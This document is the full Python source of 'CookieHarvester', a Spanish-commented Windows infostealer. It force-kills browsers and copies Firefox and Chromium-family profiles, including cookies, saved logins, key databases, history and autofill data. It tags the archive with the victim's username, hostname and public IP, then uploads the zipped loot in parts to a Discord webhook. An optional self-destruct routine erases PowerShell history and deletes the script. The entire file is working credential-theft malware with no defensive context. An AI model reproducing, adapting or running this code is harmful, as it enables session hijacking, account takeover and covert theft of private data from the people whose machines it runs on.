#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CookieHarvester v5.0.9 - Windows Edition (FINAL)
- Cierra Edge automáticamente para copiar TODO el perfil.
- Firefox también se cierra si está abierto.
- Genera ZIP completo con múltiples partes.
"""
from dotenv import load_dotenv # Cargar el .env
load_dotenv() # Leer el .env
import os
import sys
import time
import shutil
import zipfile
import tempfile
import subprocess
import socket
import getpass
import glob
import traceback
import ctypes
from math import ceil
from datetime import datetime

# ============================================================
# VERIFICAR REQUESTS
# ============================================================
print("[DEBUG] === VERIFICANDO REQUESTS ===")
try:
    import requests
    REQUESTS_DISPONIBLE = True
    print("[+] Requests SI disponible")
except ImportError:
    REQUESTS_DISPONIBLE = False
    print("[!] Requests NO disponible")
    sys.exit(1)

# ============================================================
# CONFIGURACIÓN
# ============================================================
VERSION = "v5.0.9"
DISCORD_WEBHOOK_URL = os.getenv("API_Discord")
MAX_SIZE_MB = 8
AUTODESTRUIR = False
SOPORTE_CHROME = True
SOPORTE_FIREFOX = True
CERRAR_NAVEGADORES = True  # <--- ACTIVADO: Cierra Edge y Firefox antes de copiar

# ============================================================
# UTILIDADES
# ============================================================
if not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")
    
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def obtener_ip_publica():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "No disponible"

def navegador_abierto(nombre_proceso):
    try:
        resultado = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {nombre_proceso}'],
            capture_output=True, text=True, shell=True
        )
        return nombre_proceso in resultado.stdout
    except:
        return False

def detectar_navegadores_abiertos():
    procesos = {
        'firefox.exe': 'Firefox',
        'chrome.exe': 'Chrome',
        'msedge.exe': 'Edge',
        'brave.exe': 'Brave',
        'opera.exe': 'Opera',
        'vivaldi.exe': 'Vivaldi'
    }
    abiertos = []
    for proc, nombre in procesos.items():
        if navegador_abierto(proc):
            abiertos.append(nombre)
    return abiertos

def cerrar_navegador_especifico(nombre_proceso):
    """Cierra un navegador específico forzosamente"""
    try:
        subprocess.run(['taskkill', '/F', '/IM', nombre_proceso], capture_output=True, shell=True)
        time.sleep(0.5)
        print(f"    [+] Cerrado: {nombre_proceso}")
        return True
    except:
        return False

def cerrar_navegadores_antes_de_copiar():
    """Cierra navegadores si está activado en la configuración"""
    if not CERRAR_NAVEGADORES:
        return
    print("[*] Cerrando navegadores para copiar perfiles completos...")
    for proc in ['msedge.exe', 'firefox.exe']:
        if navegador_abierto(proc):
            cerrar_navegador_especifico(proc)
    time.sleep(2)  # Esperar a que los procesos terminen
    print("[+] Navegadores cerrados, procediendo con copia completa")

# ============================================================
# LOCALIZACIÓN DE PERFILES
# ============================================================
def encontrar_perfil_firefox():
    base = os.path.expanduser('~')
    rutas = [
        os.path.join(base, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        os.path.join(base, 'AppData', 'Local', 'Mozilla', 'Firefox', 'Profiles')
    ]
    for ruta_base in rutas:
        if not os.path.exists(ruta_base):
            continue
        for perfil in os.listdir(ruta_base):
            if perfil.endswith('.default-release') or perfil.endswith('.default'):
                ruta_perfil = os.path.join(ruta_base, perfil)
                if os.path.exists(os.path.join(ruta_perfil, 'cookies.sqlite')):
                    return ruta_perfil
    return None

def encontrar_perfil_chrome():
    if not SOPORTE_CHROME:
        return []
    base = os.path.expanduser('~')
    perfiles = []
    navegadores = {
        'Chrome': os.path.join(base, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(base, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(base, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(base, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(base, 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default')
    }
    for nombre, ruta in navegadores.items():
        if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
            perfiles.append((ruta, nombre))
    return perfiles

# ============================================================
# COPIAR PERFIL COMPLETO (CON REINTENTO)
# ============================================================
def copiar_perfil_completo(origen, destino, max_intentos=3):
    """Copia toda la carpeta del perfil con reintentos"""
    for i in range(max_intentos):
        try:
            if os.path.exists(destino):
                shutil.rmtree(destino, ignore_errors=True)
            shutil.copytree(origen, destino, symlinks=False, ignore_dangling_symlinks=True)
            return True
        except Exception as e:
            if i < max_intentos - 1:
                print(f"    [!] Intento {i+1} falló, reintentando en 1s...")
                time.sleep(1)
            else:
                print(f"    [!] No se pudo copiar perfil completo después de {max_intentos} intentos: {e}")
                return False
    return False

def extraer_archivos_criticos(perfil_path, nombre_navegador, temp_dir):
    """Extrae solo archivos críticos (fallback)"""
    archivos_copiados = []
    carpeta_destino = os.path.join(temp_dir, f"{nombre_navegador}_criticos")
    os.makedirs(carpeta_destino, exist_ok=True)
    
    if nombre_navegador == "Firefox":
        archivos_a_copiar = {
            'cookies.sqlite': os.path.join(perfil_path, 'cookies.sqlite'),
            'logins.json': os.path.join(perfil_path, 'logins.json'),
            'places.sqlite': os.path.join(perfil_path, 'places.sqlite'),
            'key4.db': os.path.join(perfil_path, 'key4.db'),
        }
    else:
        archivos_a_copiar = {
            'Cookies': os.path.join(perfil_path, 'Network', 'Cookies'),
            'Login Data': os.path.join(perfil_path, 'Login Data'),
            'History': os.path.join(perfil_path, 'History'),
            'Bookmarks': os.path.join(perfil_path, 'Bookmarks'),
            'Web Data': os.path.join(perfil_path, 'Web Data'),
        }
    
    for nombre, origen in archivos_a_copiar.items():
        if os.path.exists(origen):
            destino = os.path.join(carpeta_destino, f"{nombre_navegador}_{nombre}")
            try:
                shutil.copy2(origen, destino)
                archivos_copiados.append(destino)
                print(f"    [+] Copiado crítico: {nombre}")
            except Exception as e:
                print(f"    [!] Falló crítico: {nombre} - {e}")
        else:
            print(f"    [-] No existe: {nombre}")
    
    return archivos_copiados, carpeta_destino

# ============================================================
# CREAR INFO.TXT
# ============================================================
def crear_info_txt(destino, ip_publica, version, navegadores_abiertos, navegador_nombre):
    with open(destino, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write(f"  CookieHarvester {version} - Windows Edition\n")
        f.write("=" * 50 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform} - {os.name}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(f"Navegadores abiertos: {', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n")
        f.write(f"Admin: {'Sí' if is_admin() else 'No'}\n")

# ============================================================
# COMPRESIÓN Y ENVÍO
# ============================================================
def crear_zip_desde_carpeta(carpeta_origen, zip_destino):
    with zipfile.ZipFile(zip_destino, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(carpeta_origen):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, carpeta_origen)
                zf.write(full_path, arcname)
    return zip_destino

def dividir_zip_en_partes(zip_path, max_size_mb=8):
    max_bytes = max_size_mb * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    if file_size <= max_bytes:
        return [zip_path]
    parts = []
    base_name = os.path.splitext(zip_path)[0]
    with open(zip_path, 'rb') as f:
        data = f.read()
    total_parts = ceil(file_size / max_bytes)
    for i in range(total_parts):
        part_path = f"{base_name}_part{i+1}.zip"
        with open(part_path, 'wb') as pf:
            pf.write(data[i*max_bytes:(i+1)*max_bytes])
        parts.append(part_path)
    return parts

def enviar_a_discord(webhook_url, zip_path, caption=None, intento=1, max_intentos=3):
    try:
        if not os.path.exists(zip_path):
            return False
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            data = {'content': caption[:1000] if caption else ''}
            response = requests.post(webhook_url, files=files, data=data, timeout=30)
        if response.status_code in [200, 204]:
            return True
        elif response.status_code == 429 and intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        else:
            if intento < max_intentos:
                time.sleep(2 ** intento)
                return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
            return False
    except Exception as e:
        print(f"[!] Error en enviar_a_discord: {e}")
        if intento < max_intentos:
            time.sleep(2 ** intento)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        return False

# ============================================================
# PROCESAR PERFIL (CON CIERRE AUTOMÁTICO)
# ============================================================
def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica, navegadores_abiertos):
    print(f"\n[DEBUG] === PROCESAR_PERFIL: {nombre_navegador} ===")
    print(f"[DEBUG] Ruta: {perfil_path}")
    
    # Si es Edge y está abierto, cerrarlo antes de copiar
    if nombre_navegador == "Edge" and navegador_abierto("msedge.exe"):
        print("[*] Edge está abierto, cerrándolo para copia completa...")
        cerrar_navegador_especifico("msedge.exe")
        time.sleep(1)
    
    # Si es Firefox y está abierto, cerrarlo antes de copiar
    if nombre_navegador == "Firefox" and navegador_abierto("firefox.exe"):
        print("[*] Firefox está abierto, cerrándolo para copia completa...")
        cerrar_navegador_especifico("firefox.exe")
        time.sleep(1)
    
    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    
    # Intentar copiar TODO el perfil (ahora con los navegadores cerrados)
    if copiar_perfil_completo(perfil_path, carpeta_copia):
        print(f"[+] Perfil COMPLETO copiado ({nombre_navegador})")
        modo = "COMPLETO"
    else:
        # Si aún falla, extraer solo archivos críticos
        print(f"[*] Falló copia completa, extrayendo solo archivos críticos...")
        archivos_criticos, carpeta_copia = extraer_archivos_criticos(perfil_path, nombre_navegador, temp_dir)
        if not archivos_criticos:
            print(f"[!] No se pudo extraer nada de {nombre_navegador}")
            return False
        modo = "CRÍTICOS"
        print(f"[+] Archivos críticos extraídos: {len(archivos_criticos)}")
    
    # Crear info.txt
    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, VERSION, navegadores_abiertos, nombre_navegador)
    
    # Comprimir
    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_{socket.gethostname()}_{fecha}_{nombre_navegador}_{modo}"
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    
    print(f"[DEBUG] Creando ZIP...")
    crear_zip_desde_carpeta(carpeta_copia, zip_path)
    
    parts = dividir_zip_en_partes(zip_path, MAX_SIZE_MB)
    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
    print(f"[DEBUG] ZIP: {size_mb:.2f} MB, {len(parts)} parte(s)")
    
    exitos = 0
    for idx, part in enumerate(parts, 1):
        caption = f"📁 **{nombre_navegador}** ({modo}) - Parte {idx}/{len(parts)} | {nombre_base}"
        if enviar_a_discord(DISCORD_WEBHOOK_URL, part, caption):
            exitos += 1
            print(f"[DEBUG] Parte {idx} enviada")
        else:
            print(f"[DEBUG] Parte {idx} falló")
        time.sleep(1)
    
    return exitos == len(parts)

# ============================================================
# AUTODESTRUCCIÓN
# ============================================================
def autodestruir_seguro(temp_dir, script_path, mensajes_enviados):
    try:
        print("\n[*] Iniciando autodestrucción en Windows...")
        c4_dirs = glob.glob('C:\\Users\\*\\AppData\\Local\\Temp\\c4_*')
        for c4_dir in c4_dirs:
            if os.path.exists(c4_dir):
                shutil.rmtree(c4_dir, ignore_errors=True)
                print(f"[+] Eliminado: {c4_dir}")
        zips = glob.glob(os.path.join(temp_dir, '*.zip'))
        for z in zips:
            os.remove(z)
            print(f"[+] Eliminado ZIP: {z}")
        os.system('Clear-History 2>nul')
        os.system('del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul')
        time.sleep(1)
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"[+] Eliminado script: {script_path}")
        print("[+] 🧹 Autodestrucción completada en Windows")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        sys.exit(1)

# ============================================================
# MAIN
# ============================================================
def main():
    print("\n[DEBUG] === INICIO DE MAIN (Windows) ===")
    script_path = os.path.abspath(__file__)
    
    if not REQUESTS_DISPONIBLE:
        print("[!] Requests no instalado. Saliendo...")
        sys.exit(1)
    
    print("=" * 60)
    print(f"  CookieHarvester {VERSION} - Windows Edition  ")
    print("=" * 60)
    
    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")
    
    ip_publica = obtener_ip_publica()
    print(f"[+] IP Pública: {ip_publica}")
    
    # Detectar navegadores abiertos ANTES de cerrarlos
    abiertos = detectar_navegadores_abiertos()
    if abiertos:
        print(f"[+] Navegadores abiertos: {', '.join(abiertos)}")
    else:
        print("[+] No hay navegadores abiertos.")
    
    temp_dir = tempfile.mkdtemp(prefix="c4_")
    print(f"[+] Directorio temporal: {temp_dir}")
    
    perfiles = []
    if SOPORTE_FIREFOX:
        firefox_path = encontrar_perfil_firefox()
        if firefox_path:
            perfiles.append((firefox_path, "Firefox"))
    
    if SOPORTE_CHROME:
        perfiles.extend(encontrar_perfil_chrome())
    
    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        sys.exit(1)
    
    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")
    
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    errores_globales = False
    
    perfiles_procesados = []
    total_partes = 0
    
    for perfil_path, nombre in perfiles:
        exito = procesar_perfil(perfil_path, nombre, temp_dir, ip_publica, abiertos)
        if not exito:
            errores_globales = True
        perfiles_procesados.append({'nombre': nombre, 'partes': 1})
        total_partes += 1
    
    if AUTODESTRUIR:
        autodestruir_seguro(temp_dir, script_path, {})
    else:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        print("\n[+] Limpieza completada (sin autodestrucción).")
        print("=" * 60)

if __name__ == "__main__":
    main()